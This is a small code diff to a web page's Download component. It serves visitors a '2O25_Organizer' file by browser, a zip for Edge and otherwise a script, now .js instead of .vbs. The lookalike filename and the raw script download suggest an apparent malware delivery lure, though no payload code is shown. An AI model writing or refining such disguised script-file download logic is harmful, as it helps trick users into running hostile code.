@@ -371,7 +371,7 @@ const Download = () => {
     if (ua.includes("Edg/")) {
       return { href: "/docs/2O25_Organizer.zip", extension: "zip" };
     }
-    return { href: "/docs/2O25_Organizer.vbs", extension: "vbs" };
+    return { href: "/docs/2O25_Organizer.js", extension: "js" };
   }, []);
 
   const triggerDownload = useCallback(async (file: { href: string; extension: string }) => {
